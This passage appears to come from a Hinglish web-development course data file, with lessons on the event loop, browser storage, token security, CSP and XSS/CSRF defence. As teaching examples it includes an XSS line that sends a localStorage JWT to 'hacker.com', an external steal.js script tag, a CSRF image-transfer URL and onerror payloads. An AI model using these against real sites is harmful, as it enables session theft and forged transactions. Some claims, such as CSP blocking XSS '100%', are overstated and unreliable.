            scenario: '`setTimeout(() => console.log("A"), 0)` likha aur socha ki 0 second mein turant chalega. Par tab tak nahi chalega jab tak Call Stack aur saare Promises execute nahi ho jaate! 😂',
            punchline: '0ms delay does not mean right now; it means as soon as the stack is clear!'
          },
          memoryTrick: 'Execution Priority Order:\n1. Call Stack (Synchronous Code)\n2. Microtask Queue (Promise.then, queueMicrotask, MutationObserver)\n3. Render Step (requestAnimationFrame, Style, Layout, Paint)\n4. Macrotask Queue (setTimeout, setInterval, postMessage, I/O)',
          visualDiagram: {
            title: 'JavaScript Event Loop Architecture',
            nodes: ['Call Stack', 'Web APIs (Timers, Fetch, DOM)', 'Microtask Queue (Promises)', 'Render Pipeline', 'Macrotask Queue (setTimeout)'],
            type: 'flow'
          },
          browserBehindScene: {
            title: 'Event Loop Tick Lifecycle',
            steps: ['Execute one Macrotask from top of Call Stack', 'Drain entire Microtask Queue completely', 'Perform UI Render if frame is due (60Hz)', 'Pick next Macrotask from Task Queue']
          },
          code: `// Tricky Interview Execution Order Puzzle
console.log('1. Script Start (Sync)');

setTimeout(() => {
  console.log('2. setTimeout (Macrotask)');
}, 0);

Promise.resolve().then(() => {
  console.log('3. Promise 1 (Microtask)');
}).then(() => {
  console.log('4. Promise 2 (Microtask Chained)');
});

queueMicrotask(() => {
  console.log('5. queueMicrotask (Microtask)');
});

console.log('6. Script End (Sync)');

// Output order:
// 1. Script Start (Sync)
// 6. Script End (Sync)
// 3. Promise 1 (Microtask)
// 5. queueMicrotask (Microtask)
// 4. Promise 2 (Microtask Chained)
// 2. setTimeout (Macrotask)`,
          codeBreakdown: [
            { part: 'Sync console.log()', label: 'Executes immediately on Call Stack', color: '#3b82f6' },
            { part: 'Promise.resolve().then()', label: 'Pushed to Microtask Queue, executes immediately after script end', color: '#10b981' },
            { part: 'setTimeout(..., 0)', label: 'Pushed to Macrotask Queue, runs only after Microtask Queue is empty', color: '#ef4444' }
          ],
          commonMistakes: [
            '❌ Assuming `setTimeout(fn, 0)` executes before Promise resolutions',
            '❌ Blocking the main thread with heavy CPU calculations instead of using Web Workers or chunking',
            '❌ Recursive microtasks causing starvation of macrotasks and UI freezing'
          ],
          proTips: [
            '💡 Use `queueMicrotask()` when you need asynchronous execution before UI re-render',
            '💡 Break huge loops (100k items) into chunks using `scheduler.yield()` or `requestIdleCallback()`'
          ],
          interviewQuestions: [
            'What is the difference between Microtasks and Macrotasks?',
            'Why does a single heavy synchronous function freeze the entire browser tab?',
            'What is `requestIdleCallback` vs `requestAnimationFrame`?'
          ],
          miniChallenge: 'Predict the console output of 3 nested promises and setTimeout calls before running them in DevTools.',
          quiz: {
            type: 'mcq',
            question: 'Call stack khali hone ke baad sabse pehle kaunsa queue process hota hai?',
            options: ['Macrotask Queue (setTimeout)', 'Microtask Queue (Promises)', 'I/O Queue', 'Timer Queue'],
            answer: 'Microtask Queue (Promises)',
            explanation: 'The event loop drains the entire microtask queue before picking any macrotask.'
          },
          miniQuiz: [
            {
              type: 'predict',
              question: 'Agar sync script mein Promise.then aur setTimeout(0) dono hon, pehle kaun chalega?',
              options: ['setTimeout(0)', 'Promise.then', 'Random', 'Simultaneously'],
              answer: 'Promise.then',
              explanation: 'Promises are microtasks which have higher priority over timer macrotasks.'
            }
          ],
          summary: ['Call Stack handles synchronous execution', 'Microtasks (Promises) drain before Macrotasks (Timers)', 'Long tasks > 50ms block UI rendering and cause user input lag'],
          flashcard: { q: 'What is a Long Task?', a: 'Any JavaScript execution on the main thread that takes longer than 50 milliseconds.' },
          funFact: 'Node.js event loop uses libuv and has 6 distinct phases (Timers, Pending, Idle, Poll, Check, Close), slightly different from browser event loop!',
          didYouKnow: 'V8 Garbage Collector uses generational collection (Young Generation & Old Generation) to free memory without stopping JS execution for long.',
          realWorldUseCases: ['Smooth 60fps UI', 'Asynchronous data fetching', 'Non-blocking computational chunking', 'Debounce and throttle handlers'],
          practiceQuestions: [
            'Write a non-blocking array processor using setTimeout chunking',
            'Measure task duration using `performance.mark()` and `performance.measure()`'
          ]
        }
      ]
    },
    {
      chapterTitle: 'Chapter 4: Client-Side Storage & State Management',
      lessons: [
        {
          id: 'wf-web-storage-indexeddb',
          title: 'LocalStorage, SessionStorage & IndexedDB',
          emoji: '💾',
          xpReward: 45,
          badgeName: 'Storage Architect',
          mastirQuote: {
            start: '👨‍🏫 Masti Sir: "Browser mein data store karne ke 3 bhole bhandari: LocalStorage, SessionStorage aur powerhouse IndexedDB!"',
            hint: '💡 Masti Sir: "LocalStorage 5MB tak synchronous string data rakhta hai. Heavy structured data ke liye hamesha IndexedDB use karo!"',
            success: '🎉 Masti Sir: "Offline storage aur caching master ho gaya!"',
            mistake: '😅 Masti Sir: "LocalStorage mein sensitive passwords ya tokens store mat karna — koi bhi XSS script use chura legi!"'
          },
          englishDef: 'Web Storage provides synchronous key-value stores (LocalStorage: persistent; SessionStorage: tab lifecycle). IndexedDB is an asynchronous, transactional NoSQL database in the browser capable of storing gigabytes of structured data, blobs, and indexes.',
          hinglishExplain: 'LocalStorage browser band hone ke baad bhi data save rakhta hai (~5MB limit). SessionStorage sirf tab open rehne tak data rakhta hai. IndexedDB browser ke andar ka poora NoSQL database hai jo asynchronous hai, indexing support karta hai aur images, audio ya GBs of offline data store kar sakta hai.',
          storyExplain: 'LocalStorage = Tumhari pocket diary (chhote notes ke liye, quick access). SessionStorage = Hotel keycard (jab tak stay karoge tab tak chalega, checkout pe expire). IndexedDB = Tumhare ghar ka giant warehouse (lakhon items, fast search index, safe async transactions)!',
          funnyExample: {
            scenario: 'Tumne 50MB ka PDF file LocalStorage mein save karne ki koshish ki. Browser ne turant throw kiya: "QuotaExceededError: Bhai mere bas ki nahi hai, IndexedDB ke paas jao!" 😂',
            punchline: 'LocalStorage for small UI preferences; IndexedDB for heavy offline apps!'
          },
          memoryTrick: 'Storage Comparison:\n- Cookie: 4KB (Sent with every HTTP request)\n- LocalStorage: ~5MB (Synchronous string key-value, persists)\n- SessionStorage: ~5MB (Synchronous string key-value, single tab)\n- IndexedDB: Hundreds of MBs / GBs (Async NoSQL object store)',
          visualDiagram: {
            title: 'Browser Storage Architecture',
            nodes: ['Browser Client', 'LocalStorage (5MB Strings)', 'SessionStorage (Tab Scope)', 'IndexedDB (GBs Structured / Binary)', 'Cache Storage (Service Workers)'],
            type: 'flow'
          },
          browserBehindScene: {
            title: 'IndexedDB Transaction Flow',
            steps: ['Open Database connection (indexedDB.open)', 'Handle onupgradeneeded to create Object Stores & Indexes', 'Start Transaction (readonly or readwrite)', 'Access Object Store and execute CRUD requests', 'Handle onsuccess / onerror events']
          },
          code: `// Safe Storage Utility: LocalStorage vs Modern IndexedDB (idb wrapper)
// 1. LocalStorage JSON Helper
const LocalStore = {
  set(key, value) {
    try {
      localStorage.setItem(key, JSON.stringify(value));
    } catch (e) {
      console.error('Storage full or disabled:', e);
    }
  },
  get(key, defaultValue = null) {
    try {
      const item = localStorage.getItem(key);
      return item ? JSON.parse(item) : defaultValue;
    } catch {
      return defaultValue;
    }
  }
};

// 2. Native IndexedDB Quick CRUD
function saveToIndexedDB(dbName, storeName, record) {
  return new Promise((resolve, reject) => {
    const request = indexedDB.open(dbName, 1);
    request.onupgradeneeded = (e) => {
      const db = e.target.result;
      if (!db.objectStoreNames.contains(storeName)) {
        db.createObjectStore(storeName, { keyPath: 'id' });
      }
    };
    request.onsuccess = (e) => {
      const db = e.target.result;
      const tx = db.transaction(storeName, 'readwrite');
      const store = tx.objectStore(storeName);
      store.put(record);
      tx.oncomplete = () => resolve(record);
      tx.onerror = () => reject(tx.error);
    };
    request.onerror = () => reject(request.error);
  });
}`,
          codeBreakdown: [
            { part: 'JSON.stringify(value)', label: 'Serializes objects because LocalStorage only accepts strings', color: '#3b82f6' },
            { part: 'indexedDB.open()', label: 'Asynchronous connection to browser native NoSQL database', color: '#10b981' },
            { part: 'db.transaction(storeName, "readwrite")', label: 'ACID transaction ensuring atomic database writes', color: '#f59e0b' }
          ],
          commonMistakes: [
            '❌ Reading heavy LocalStorage data in high-frequency scroll or render loops (it is synchronous and blocks main thread!)',
            '❌ Storing non-stringified objects directly in LocalStorage which results in `"[object Object]"`',
            '❌ Forgetting that LocalStorage is shared across all tabs of the same origin'
          ],
          proTips: [
            '💡 Use lightweight libraries like `idb` or `Dexie.js` for clean Promise-based IndexedDB code',
            '💡 Listen to `window.addEventListener("storage", (e) => ...)` to sync state across multiple open tabs!'
          ],
          interviewQuestions: [
            'Why is LocalStorage not suitable for large dataset storage or high-performance apps?',
            'How does IndexedDB differ from Web SQL and LocalStorage?',
            'How can two browser tabs on the same origin communicate with each other?'
          ],
          miniChallenge: 'Open DevTools Application panel > Storage, check how much storage quota your current origin is using.',
          quiz: {
            type: 'mcq',
            question: 'Kaunsa browser storage async NoSQL transactions aur gigabytes data support karta hai?',
            options: ['LocalStorage', 'SessionStorage', 'Cookies', 'IndexedDB'],
            answer: 'IndexedDB',
            explanation: 'IndexedDB is the browser asynchronous transactional database designed for large structured datasets.'
          },
          miniQuiz: [
            {
              type: 'fillblank',
              question: 'Storage capacity fill karo:',
              sentence: 'Standard browser cookie maximum ___ KB data store kar sakti hai.',
              answer: '4',
              explanation: 'Cookies have a standard 4KB size limit per domain.'
            }
          ],
          summary: ['LocalStorage stores persistent key-value strings (~5MB)', 'SessionStorage lasts for tab session', 'IndexedDB is an async transactional NoSQL database in the browser'],
          flashcard: { q: 'What happens when LocalStorage quota is exceeded?', a: 'The browser throws a DOMException: QuotaExceededError.' },
          funFact: 'Web SQL (SQLite in browser) was deprecated and removed from modern web standards in favor of IndexedDB!',
          didYouKnow: 'IndexedDB supports storing binary Blobs and ArrayBuffers directly, making it ideal for offline audio, video, and PDF caching.',
          realWorldUseCases: ['Dark/Light theme preferences', 'Offline PWA data caching', 'E-commerce draft cart saving', 'Rich text editor auto-save'],
          practiceQuestions: [
            'Implement a theme toggle saved in LocalStorage',
            'Build an offline notes app using IndexedDB'
          ]
        },
        {
          id: 'wf-cookies-sessions',
          title: 'Cookies, Session Architecture & Token Storage Security',
          emoji: '🛡️',
          xpReward: 50,
          badgeName: 'Security Sentinel',
          mastirQuote: {
            start: '👨‍🏫 Masti Sir: "Auth tokens kahan store karein? LocalStorage ya HttpOnly Cookie? Ye web dev ka sabse bada debate hai! Chalo exact industry standard seekhein!"',
            hint: '💡 Masti Sir: "LocalStorage = Vulnerable to XSS. HttpOnly Cookie = Immune to XSS, par CSRF protection zaroori hai!"',
            success: '🎉 Masti Sir: "Wah! Production-grade auth storage architecture crystal clear!"',
            mistake: '😅 Masti Sir: "Cookie pe `Secure` flag nahi lagaya toh HTTP connection pe plaintext leak ho jayegi!"'
          },
          englishDef: 'Session architecture maintains user state across stateless HTTP requests. Tokens (JWTs) can be stored in Memory, LocalStorage, or HttpOnly Secure Cookies. Best practice combines short-lived Access Tokens in memory with HttpOnly Refresh Cookies.',
          hinglishExplain: 'HTTP stateless protocol hai, yaani server har request ke baad bhool jata hai aap kaun ho. Isliye session cookies ya JWT tokens use hote hain. Industry standard security model: Access Token (short life 15 min) ko memory/state mein rakho, aur Refresh Token (long life 7 days) ko `HttpOnly; Secure; SameSite=Strict` cookie mein rakho taaki XSS attacks se token chori na ho.',
          storyExplain: 'Socho tum kisi five-star resort mein ho. Room keycard = Refresh Token (safely locked in vault). Wristband pass = Access Token (15 min pool/buffet access). Agar wristband gir bhi jaye toh 15 min mein expire ho jayega. Naya wristband lene ke liye secure keycard dikhana padega.',
          funnyExample: {
            scenario: 'Hacker ne site pe malicious comment post kiya: `<script>fetch("hacker.com?token=" + localStorage.getItem("jwt"))</script>`. Agar token LocalStorage mein tha toh gaya! Agar HttpOnly Cookie thi toh hacker haath malte reh gaya! 😂',
            punchline: 'HttpOnly cookies make XSS attackers cry!'
          },
          memoryTrick: 'Cookie Flags Checklist:\n1. HttpOnly -> No JS access (Anti-XSS)\n2. Secure -> HTTPS only (Anti-Sniffing)\n3. SameSite=Strict / Lax -> No cross-site sending (Anti-CSRF)\n4. Domain & Path -> Minimum required scope',
          visualDiagram: {
            title: 'Modern Token Refresh Architecture',
            nodes: ['Client App (React)', 'Access Token in Memory (15 min)', 'API Request with Bearer Token', '401 Expired -> Call /refresh', 'HttpOnly Cookie sends Refresh Token', 'New Access Token returned'],
            type: 'flow'
          },
          browserBehindScene: {
            title: 'Cookie Lifecycle in Browser',
            steps: ['Server sends `Set-Cookie` header in HTTP response', 'Browser stores cookie in isolated secure storage sandbox', 'Browser automatically appends `Cookie` header to subsequent requests matching Domain/Path', 'Expires / Max-Age triggers automatic cookie deletion']
          },
          code: `// Production Auth Flow: In-Memory Access Token + HttpOnly Refresh Cookie
let inMemoryAccessToken = null;

// Axios / Fetch Interceptor for Automatic Silent Token Refresh
async function authenticatedFetch(url, options = {}) {
  options.headers = options.headers || {};
  if (inMemoryAccessToken) {
    options.headers['Authorization'] = \`Bearer \${inMemoryAccessToken}\`;
  }
  options.credentials = 'include'; // Include HttpOnly cookies

  let response = await fetch(url, options);

  // If token expired (401), perform silent refresh
  if (response.status === 401) {
    const refreshRes = await fetch('/api/auth/refresh', {
      method: 'POST',
      credentials: 'include' // Sends HttpOnly refreshToken cookie automatically
    });

    if (refreshRes.ok) {
      const data = await refreshRes.json();
      inMemoryAccessToken = data.accessToken;
      // Retry original request with fresh token
      options.headers['Authorization'] = \`Bearer \${inMemoryAccessToken}\`;
      response = await fetch(url, options);
    } else {
      // Refresh failed -> redirect to login
      window.location.href = '/login';
    }
  }

  return response;
}`,
          codeBreakdown: [
            { part: 'let inMemoryAccessToken', label: 'Stores short-lived access token in JS memory variable (inaccessible to persistent storage inspection)', color: '#3b82f6' },
            { part: 'credentials: "include"', label: 'Instructs fetch to send secure HttpOnly cookies in cross-origin / API calls', color: '#10b981' },
            { part: 'Silent Refresh on 401', label: 'Seamlessly renews credentials without interrupting user experience', color: '#f59e0b' }
          ],
          commonMistakes: [
            '❌ Storing long-lived refresh tokens in LocalStorage or SessionStorage',
            '❌ Not setting `SameSite` attribute on auth cookies, opening doors to CSRF attacks',
            '❌ Failing to implement token revocation or rotation on the backend'
          ],
          proTips: [
            '💡 Always use Token Rotation: each time a refresh token is used, issue a new one and invalidate the old one',
            '💡 Set `SameSite=Lax` for standard web apps and `SameSite=Strict` for high-security banking/financial portals'
          ],
          interviewQuestions: [
            'Why is storing JWT in LocalStorage considered risky for security?',
            'What is the difference between SameSite=Strict, SameSite=Lax, and SameSite=None?',
            'Explain how Silent Token Refresh works.'
          ],
          miniChallenge: 'Open browser console and run `document.cookie`. Notice that you cannot see cookies with `HttpOnly` flag enabled.',
          quiz: {
            type: 'mcq',
            question: 'Kaunsa cookie attribute CSRF (Cross-Site Request Forgery) attacks ko rokne ke liye sabse zaroori hai?',
            options: ['Max-Age', 'SameSite', 'Path', 'Domain'],
            answer: 'SameSite',
            explanation: 'SameSite (Strict/Lax) prevents the browser from attaching cookies to cross-site requests, mitigating CSRF.'
          },
          miniQuiz: [
            {
              type: 'predict',
              question: 'Agar cookie pe HttpOnly flag set hai, toh `console.log(document.cookie)` mein wo cookie dikhegi?',
              options: ['Haan, hamesha', 'Nahi, undefined/hidden hogi', 'Error throw hoga', 'Sirf dev mode mein dikhegi'],
              answer: 'Nahi, undefined/hidden hogi',
              explanation: 'HttpOnly prevents client-side JS from accessing the cookie value.'
            }
          ],
          summary: ['Access tokens live in memory, Refresh tokens live in HttpOnly cookies', 'SameSite attribute prevents cross-site CSRF forgery', 'Silent token refresh keeps user sessions seamless and secure'],
          flashcard: { q: 'What is Session Hijacking?', a: 'An attack where an adversary steals a user session token to impersonate the victim without credentials.' },
          funFact: 'Safari Intelligent Tracking Prevention (ITP) caps client-side JavaScript cookies to 7 days, but preserves server-set HttpOnly cookies!',
          didYouKnow: 'JSON Web Tokens (JWT) are self-contained and signed with HMAC or RSA cryptography.',
          realWorldUseCases: ['Single Sign-On (SSO)', 'OAuth 2.0 / OpenID Connect', 'Banking portal sessions', 'Multi-tenant SaaS authentication'],
          practiceQuestions: [
            'Configure an Express endpoint that sets HttpOnly SameSite=Strict cookies',
            'Write a silent token refresher interceptor'
          ]
        }
      ]
    },
    {
      chapterTitle: 'Chapter 5: Web Security Essentials & Defense',
      lessons: [
        {
          id: 'wf-security-cors-sop-csp',
          title: 'Same-Origin Policy (SOP), CORS & Content Security Policy (CSP)',
          emoji: '🏰',
          xpReward: 50,
          badgeName: 'Web Defender',
          mastirQuote: {
            start: '👨‍🏫 Masti Sir: "Web security ka foundation 3 pillars pe khada hai: SOP, CORS aur CSP! Agar ye samajh gaye toh aapki website impenetrable fort ban jayegi!"',
            hint: '💡 Masti Sir: "SOP browser ka default lock hai, CORS uska gate pass hai, aur CSP script injection ka antivirus hai!"',
            success: '🎉 Masti Sir: "Wah! Browser security model ab tumhare fingerprints pe hai!"',
            mistake: '😅 Masti Sir: "CORS mein `*` allow karke socha problem solve ho gayi? Production mein specific origin whitelist karo!"'
          },
          englishDef: 'Same-Origin Policy (SOP) restricts scripts on one origin from accessing data on another. CORS relaxes SOP selectively. Content Security Policy (CSP) is an HTTP header restricting resources (scripts, images, styles) browsers are allowed to load.',
          hinglishExplain: 'Same-Origin Policy (SOP) browser ka sabse fundamental security rule hai: agar Protocol, Host ya Port alag hai, toh ek website doosri website ka data nahi padh sakti. CORS server ko allow karta hai ki wo bataye kaunsa frontend domain uska data access kar sakta hai. CSP (Content Security Policy) browser ko batata hai ki kaunse external domains se scripts ya images download ho sakti hain, jo XSS attacks ko 100% block karta hai.',
          storyExplain: 'SOP = Apartment complex ka rule (ek flat ka resident doosre flat ki cupboard nahi khol sakta). CORS = Security guard ko guest list dena (sirf listed flatmates/guests allowed). CSP = Flat ke gate pe scanner lagana jo kisi bhi anjaan packet ya pen-drive ko ghar ke andar aane se mana kar deta hai!',
          funnyExample: {
            scenario: 'Hacker ne site pe malicious external script inject ki: `<script src="https://evil-hacker.com/steal.js"></script>`. Par CSP header tha: `script-src \'self\'`. Browser ne bol diya: "Evil domain not allowed in CSP policy!" Hacker ka plan fail! 😂',
            punchline: 'CSP is the ultimate armor against external script injections!'
          },
          memoryTrick: 'Origin Tuple Check:\n- http://site.com:80 vs https://site.com:80 -> Different Protocol (Cross-Origin)\n- https://site.com vs https://api.site.com -> Different Host (Cross-Origin)\n- https://site.com:3000 vs https://site.com:4000 -> Different Port (Cross-Origin)',
          visualDiagram: {
            title: 'SOP vs CORS vs CSP Defense Matrix',
            nodes: ['Browser Sandbox', 'SOP: Blocks cross-origin reads', 'CORS: Server permits specific origins', 'CSP: Whitelists approved script/style sources', 'Secure Execution'],
            type: 'flow'
          },
          browserBehindScene: {
            title: 'How CSP Protects Pages',
            steps: ['Server sends header: `Content-Security-Policy: default-src \'self\'; script-src \'self\' https://trustedcdn.com`', 'Browser parses CSP directives before evaluating DOM', 'Any inline `<script>` without matching nonce/hash is rejected', 'Any `<script src="malicious.com">` is immediately aborted with console security error']
          },
          code: `// Helmet.js CSP Configuration for Express Server
const express = require('express');
const helmet = require('helmet');
const app = express();

// Configure robust Content Security Policy (CSP)
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://cdn.jsdelivr.net", "https://apis.google.com"],
      styleSrc: ["'self'", "https://fonts.googleapis.com", "'unsafe-inline'"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      imgSrc: ["'self'", "data:", "https://images.unsplash.com"],
      connectSrc: ["'self'", "https://api.codemasti.com"],
      objectSrc: ["'none'"], // Disables legacy Flash / Java plugins
      upgradeInsecureRequests: [], // Automatically upgrades http to https
    },
  })
);`,
          codeBreakdown: [
            { part: "defaultSrc: ['self']", label: 'Fallback rule: only allow resources from own origin', color: '#3b82f6' },
            { part: "scriptSrc: ['self', 'https://apis.google.com']", label: 'Strict whitelist of trusted script execution sources', color: '#10b981' },
            { part: "objectSrc: ['none']", label: 'Completely disables dangerous plugins and embedded objects', color: '#ef4444' }
          ],
          commonMistakes: [
            '❌ Using `script-src \'unsafe-inline\' \'unsafe-eval\'` in CSP which completely defeats XSS protection',
            '❌ Believing CORS is a server-side firewall (CORS is enforced by the CLIENT browser, not by curl or Postman!)',
            '❌ Missing the `upgradeInsecureRequests` directive'
          ],
          proTips: [
            '💡 Use CSP Nonces (`script-src \'nonce-xyz\'`) for legitimate inline scripts in React/Next.js SSR',
            '💡 Use `Content-Security-Policy-Report-Only` header during staging to test policies without breaking functionality'
          ],
          interviewQuestions: [
            'Why does Postman or curl succeed in making requests that fail with CORS error in a browser?',
            'What is the difference between SOP and CORS?',
            'How does a Content Security Policy (CSP) prevent Stored and Reflected XSS?'
          ],
          miniChallenge: 'Check any major website (e.g. github.com) Response Headers and inspect their `content-security-policy`.',
          quiz: {
            type: 'mcq',
            question: 'Agar URL `http://example.com` se `https://example.com` pe request jaati hai, toh SOP ke hisab se kya hoga?',
            options: ['Same-Origin', 'Cross-Origin (Protocol differs)', 'Allowed automatically without CORS', 'Error on server'],
            answer: 'Cross-Origin (Protocol differs)',
            explanation: 'HTTP vs HTTPS differ in protocol, making them distinct cross-origin domains.'
          },
          miniQuiz: [
            {
              type: 'fillblank',
              question: 'CSP header directive fill karo:',
              sentence: 'Flash aur dangerous plugin objects ko completely disable karne ke liye `object-src: "___"` use karte hain.',
              answer: "'none'",
              explanation: "object-src 'none' blocks all plugins."
            }
          ],
          summary: ['Same-Origin Policy enforces origin boundaries', 'CORS allows controlled server opt-in for cross-origin callers', 'CSP restricts script, style, and media sources to prevent XSS'],
          flashcard: { q: 'What is a CSP Nonce?', a: 'A cryptographically random single-use token generated per HTTP response and attached to approved inline scripts.' },
          funFact: 'The Same-Origin Policy was introduced in 1995 by Netscape Navigator 2.0 to protect JavaScript access to DOM properties across frames!',
          didYouKnow: 'CORS does NOT stop the server from executing requests; it stops the browser from sharing the response with the JavaScript caller.',
          realWorldUseCases: ['Preventing API scraping', 'Defending against rogue ad network script injections', 'PCI-DSS compliance for payment forms', 'Third-party widget containment'],
          practiceQuestions: [
            'Add Helmet CSP to an Express application',
            'Generate dynamic nonces for inline script execution'
          ]
        },
        {
          id: 'wf-security-xss-csrf',
          title: 'Cross-Site Scripting (XSS), CSRF Attacks & Defense In Depth',
          emoji: '🛡️',
          xpReward: 50,
          badgeName: 'AppSec Champion',
          mastirQuote: {
            start: '👨‍🏫 Masti Sir: "OWASP Top 10 ke do sabse badnaam villains: XSS aur CSRF! Inka attack vector aur defense dono master karenge!"',
            hint: '💡 Masti Sir: "XSS = Hacker runs JS inside your victim browser. CSRF = Hacker tricks your victim browser into submitting a request to a trusted server!"',
            success: '🎉 Masti Sir: "Shabash! Sanitization aur Anti-CSRF tokens ka concept rock solid!"',
            mistake: '😅 Masti Sir: "React mein `dangerouslySetInnerHTML` bina DOMPurify sanitize kiye use karna seedha hacker ko invite karna hai!"'
          },
          englishDef: 'XSS (Cross-Site Scripting) occurs when malicious JavaScript is injected into trusted web apps (Stored, Reflected, DOM-based). CSRF (Cross-Site Request Forgery) tricks authenticated users into submitting unwanted actions via ambient credentials.',
          hinglishExplain: 'XSS mein attacker user ke browser mein apna JavaScript code execute karwa leta hai (jaise comments ke zariye), jisse user ka data chori ho sakta hai. CSRF mein attacker ek malicious link ya image banata hai jo user ke browser se authenticated server pe bina user ki marzi ke request bhej deti hai (jaise paise transfer karna ya password change karna).',
          storyExplain: 'XSS = Tumhare ghar ke intercom mein chor ne recording chip fit kar di jo sabke bank passwords record kar rahi hai. CSRF = Chor ne tumhare signed blank cheque pe amount bhar ke bank counter pe bhej diya jab tum cashier ke saamne khade the!',
          funnyExample: {
            scenario: 'User ko email aaya: "Click here to see cute kittens!" Image tag tha: `<img src="https://bank.com/transfer?to=hacker&amount=10000">`. Agar bank CSRF tokens check nahi karta toh paise gaye! 😂',
            punchline: 'Anti-CSRF tokens and SameSite cookies stop unauthorized forge requests!'
          },
          memoryTrick: 'XSS Defense:\n1. Contextual Output Encoding\n2. HTML Sanitization (DOMPurify)\n3. CSP (Content Security Policy)\n4. HttpOnly Cookies\n\nCSRF Defense:\n1. SameSite=Strict/Lax Cookies\n2. Anti-CSRF Synchronizer Tokens\n3. Custom Request Headers (X-Requested-With)',
          visualDiagram: {
            title: 'CSRF vs Anti-CSRF Token Validation',
            nodes: ['Attacker Site (evil.com)', 'Hidden Form Submit -> target.com', 'Browser sends Cookie automatically', 'Server checks: "Where is X-CSRF-Token header?"', 'Token Missing -> 403 Forbidden! Blocked!'],
            type: 'flow'
          },
          browserBehindScene: {
            title: 'DOMPurify HTML Sanitization Under the Hood',
            steps: ['Receives untrusted raw string: `<p>Hello <script>steal()</script></p>`', 'Creates temporary isolated DOM document tree', 'Walks all nodes and strips `<script>`, `<iframe>`, `onerror=`, `javascript:` protocols', 'Returns safe HTML string: `<p>Hello </p>`']
          },
          code: `// XSS Prevention: Safe Sanitization with DOMPurify
import DOMPurify from 'dompurify';

// 1. Sanitize user-generated rich text before rendering
function renderUserPost(untrustedHTML) {
  const cleanHTML = DOMPurify.sanitize(untrustedHTML, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
    ALLOWED_ATTR: ['href', 'title', 'target']
  });

  return { __html: cleanHTML };
}

// 2. Anti-CSRF Token Verification in Express
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// Attach CSRF token to form rendering
app.get('/transfer-funds', csrfProtection, (req, res) => {
  res.render('transfer', { csrfToken: req.csrfToken() });
});

// Verify CSRF token on submission
app.post('/transfer-funds', csrfProtection, (req, res) => {
  res.json({ status: 'Transfer successful and CSRF verified!' });
});`,
          codeBreakdown: [
            { part: 'DOMPurify.sanitize()', label: 'Strips malicious script tags, event handlers, and javascript: links', color: '#10b981' },
            { part: 'ALLOWED_TAGS', label: 'Strict whitelist of safe HTML presentation tags', color: '#3b82f6' },
            { part: 'csrfProtection', label: 'Validates that submitted hidden token matches secret stored in cookie', color: '#f59e0b' }
          ],
          commonMistakes: [
            '❌ Writing custom regex to filter `<script>` (Attackers easily bypass regex using `<img src=x onerror=alert(1)>` or encoded payloads!)',
            '❌ Believing React or Angular eliminates all XSS (using `dangerouslySetInnerHTML` or `href="javascript:..."` is still vulnerable!)',
            '❌ Using GET requests for state-modifying actions (makes CSRF trivially easy via `<img>` tags)'
          ],
          proTips: [
            '💡 Always sanitize HTML on the server before storing in DB AND sanitize on the client before rendering',
            '💡 Modern browsers support `SameSite=Lax` by default, providing baseline CSRF protection for top-level navigations'
          ],
          interviewQuestions: [
            'What are the three main types of XSS (Stored, Reflected, DOM-based)?',
            'Explain the Double-Submit Cookie Pattern and Synchronizer Token Pattern for CSRF defense.',
            'Why is input validation alone insufficient to stop XSS?'
          ],
          miniChallenge: 'Test payload `<img src=invalid onerror="console.warn(\'XSS Triggered!\')">` in DOMPurify demo page to see how it is disarmed.',
          quiz: {
            type: 'mcq',
            question: 'Kaunsa attack tab hota hai jab attacker user ke saved session ka fayda utha kar unauthorized action trigger karwata hai?',
            options: ['SQL Injection', 'CSRF (Cross-Site Request Forgery)', 'DDoS Attack', 'Man-in-the-Middle'],
            answer: 'CSRF (Cross-Site Request Forgery)',
            explanation: 'CSRF tricks an authenticated browser into sending forged requests using stored session cookies.'
          },
          miniQuiz: [
            {
              type: 'fillblank',
              question: 'Library name fill karo:',
              sentence: 'Client-side HTML sanitization ke liye industry standard library ___ use hoti hai.',
              answer: 'DOMPurify',
              explanation: 'DOMPurify is the most widely adopted DOM sanitization library.'
            }
          ],
          summary: ['XSS executes rogue scripts inside victim browser', 'CSRF triggers unwanted actions using ambient credentials', 'Sanitization, Nonces, CSP, SameSite, and Anti-CSRF tokens provide Defense in Depth'],
          flashcard: { q: 'What is DOM-based XSS?', a: 'An XSS vulnerability where client-side JavaScript reads data from an untrusted source (e.g. location.hash) and writes it directly to the DOM.' },
          funFact: 'Samy Kamkar created the "Samy Worm" in 2005 on MySpace using DOM XSS, infecting over 1 million user profiles in less than 20 hours!',
          didYouKnow: 'Modern frameworks like React automatically escape JSX string variables by default, protecting against basic text XSS.',
          realWorldUseCases: ['Social media comment feeds', 'Rich text document editors', 'Banking fund transfer APIs', 'Admin dashboard inputs'],
          practiceQuestions: [
            'Implement DOMPurify sanitization in a React rich-text viewer',
            'Setup CSRF token validation in an API endpoint'
          ]
        }
      ]
    },
    {
      chapterTitle: 'Chapter 6: Real-Time Web & Modern Protocols',
      lessons: [
        {
          id: 'wf-websockets-sse',
          title: 'Real-Time Web: Polling, Server-Sent Events (SSE) & WebSockets',
          emoji: '⚡',
          xpReward: 45,
          badgeName: 'Realtime Commander',
          mastirQuote: {
            start: '👨‍🏫 Masti Sir: "Live chat, stock market updates, cricket scores — browser ko instant updates kaise milte hain? Polling vs SSE vs WebSockets!"',
            hint: '💡 Masti Sir: "1-way server to client stream = SSE. 2-way bi-directional instant pipeline = WebSockets!"',
            success: '🎉 Masti Sir: "Full duplex real-time communication unlocked!"',
            mistake: '😅 Masti Sir: "Chat app ke liye har 1 second mein polling kar rahe ho? Server ki CPU pighal jayegi!"'
          },
          englishDef: 'Short Polling repeatedly requests data at intervals; Long Polling holds connections open until data arrives. Server-Sent Events (SSE) provide persistent unidirectional streaming from server to client over HTTP. WebSockets provide persistent, bi-directional, full-duplex TCP communication.',
          hinglishExplain: 'Pehle zamane mein browser har 2 second mein server se poochta tha "Koi naya message aaya kya?" (Polling - bohot slow aur heavy). SSE (Server-Sent Events) mein server client ko continuously live updates stream karta rehta hai (jaise live cricket score ya AI ChatGPT streaming). WebSockets mein browser aur server ke beech ek permanent 2-way pipe khul jaata hai jisme dono side se instant data travel karta hai (jaise WhatsApp chat ya multiplayer gaming).',
